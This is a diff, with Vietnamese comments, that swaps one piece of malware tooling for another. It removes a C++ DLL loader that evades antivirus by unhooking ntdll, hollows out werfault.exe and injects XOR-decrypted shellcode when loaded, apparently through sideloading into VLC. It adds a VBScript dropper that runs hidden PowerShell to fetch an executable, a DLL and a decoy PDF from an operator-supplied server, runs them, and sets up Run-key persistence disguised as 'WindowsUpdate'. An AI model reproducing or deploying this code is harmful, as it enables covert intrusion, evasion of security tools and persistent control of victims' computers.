@@ -1,123 +1,19 @@
-#include <iostream>
-#include <Windows.h>
-#include <string>
-#include <fstream>
-#include <iterator>
-#include <vector>
-#include "ntdll.h"
-#include "base64.h"
+Set WshShell = CreateObject("WScript.Shell")
+strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 
-// Cấu hình tiến trình sẽ bị "mượn xác"
-#define LARGE_NUMBER 500000
-#define INJECTED_PROCESS_NAME L"\\??\\C:\\Windows\\System32\\werfault.exe"
+' Thay IP_VPS của bạn vào đây
+vps = "http://IP_CUA_BAN/"
 
-void sleep();
-const std::string loadPayload();
+' Lệnh PowerShell tải file và chạy
+' WindowStyle 0 = Ẩn cửa sổ PowerShell
+psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+"""$t=$env:TEMP; " & _
+"iwr '" & vps & "app.exe' -OutF '$t\app.exe'; " & _
+"iwr '" & vps & "vinh.dll' -OutF '$t\vinh.dll'; " & _
+"iwr '" & vps & "decoy.pdf' -OutF '$t\decoy.pdf'; " & _
+"Start-Process '$t\decoy.pdf'; " & _
+"Start-Process '$t\app.exe'; " & _
+"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value '$t\app.exe' -PropertyType 'String' -Force"""
 
-// Hàm thực thi chính của Loader
-void StartEspioLoader()
-{
-    // 1. Antivurus Evasion: Sleep để tránh sandbox
-    sleep();
-
-    // 2. Unhooking: Nạp ntdll sạch từ đĩa để xóa bỏ hook của AV
-    HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
-    if (ntdll == NULL) return;
-    
-    unhookNtdll(ntdll);
-    loadNtdll(ntdll);
-
-    // 3. Giải mã shellcode từ file bên ngoài
-    const std::string payload = loadPayload();
-    if (payload.empty()) return;
-
-    SIZE_T size = payload.size();
-    LARGE_INTEGER sectionSize = { size };
-    HANDLE currentProcess = GetCurrentProcess();
-    HANDLE section = NULL;
-    PVOID localSection = NULL, targetSection = NULL;
-    PRTL_USER_PROCESS_INFORMATION targetProcessInformation = NULL;
-    PRTL_USER_PROCESS_PARAMETERS targetProcessParameters = NULL;
-    UNICODE_STRING imagePathName = {};
-    HANDLE targetProcessThread = NULL;
-    NTSTATUS status = NULL;
-
-    // 4. Process Hollowing: Tạo section và map vào tiến trình werfault.exe
-    status = NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-    status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
-
-    RtlInitUnicodeString(&imagePathName, INJECTED_PROCESS_NAME);
-    status = RtlCreateProcessParameters(&targetProcessParameters, &imagePathName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-
-    targetProcessInformation = (PRTL_USER_PROCESS_INFORMATION)malloc(sizeof(RtlUserProcessInformation));
-    status = RtlCreateUserProcess(&imagePathName, NULL, targetProcessParameters, NULL, NULL, currentProcess, FALSE, NULL, NULL, targetProcessInformation);
-
-    status = NtMapViewOfSection(section, targetProcessInformation->ProcessHandle, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
-
-    // 5. Ghi shellcode đã giải mã vào vùng nhớ của tiến trình mục tiêu
-    status = NtWriteVirtualMemory(currentProcess, localSection, (PVOID)payload.c_str(), size, NULL);
-
-    // 6. Kích hoạt thực thi
-    status = RtlCreateUserThread(targetProcessInformation->ProcessHandle, NULL, FALSE, 0, 0, 0, targetSection, NULL, &targetProcessThread, NULL);
-
-    // Dọn dẹp
-    NtClose(targetProcessThread);
-    NtClose(targetProcessInformation->ProcessHandle);
-    free(targetProcessInformation);
-    NtClose(section);
-    FreeLibrary(ntdll);
-}
-
-// TRIGGER: Hàm khởi tạo DLL
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-{
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
-    {
-        // Chạy Loader trong một luồng riêng để VLC không bị "treo" (Not Responding)
-        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartEspioLoader, NULL, 0, NULL);
-        if (hThread) CloseHandle(hThread);
-    }
-    return TRUE;
-}
-
-void sleep()
-{
-    for (int i = 0; i <= LARGE_NUMBER; i++) {
-        for (int j = 2; j <= i / 2; j++) {
-            if (i % j == 0) break;
-        }
-    }
-}
-
-// Hàm giải mã Payload từ file .bin (Espio logic)
-const std::string loadPayload()
-{
-    // Đọc Key từ file bên cạnh
-    std::ifstream kFile("key.bin");
-    if (!kFile) return "";
-    std::string key((std::istreambuf_iterator<char>(kFile)), std::istreambuf_iterator<char>());
-    kFile.close();
-
-    // Đọc Obfuscated Payload
-    std::ifstream pFile("obfuscatedPayload.bin");
-    if (!pFile) return "";
-    std::string obfuscatedPayload((std::istreambuf_iterator<char>(pFile)), std::istreambuf_iterator<char>());
-    pFile.close();
-
-    // Giải mã Base64 -> Hex -> XOR
-    const std::string encryptedPayload = base64_decode(obfuscatedPayload);
-    size_t encryptedPayloadSize = encryptedPayload.size();
-    std::string payload = "";
-
-    int keyIndex = 0;
-    for (int i = 0; i < encryptedPayloadSize; i += 4)
-    {
-        std::string currentByte = std::string() + encryptedPayload[i] + encryptedPayload[i + 1] + encryptedPayload[i + 2] + encryptedPayload[i + 3];
-        try {
-            payload += (char)(std::stol(currentByte, nullptr, 0) ^ key[keyIndex++ % key.size()]);
-        } catch (...) { continue; }
-    }
-
-    return payload;
-}
-
+' Số 0 ở cuối đảm bảo VBS chạy lệnh PowerShell mà không hiện cửa sổ CMD
+WshShell.Run psCmd, 0, False
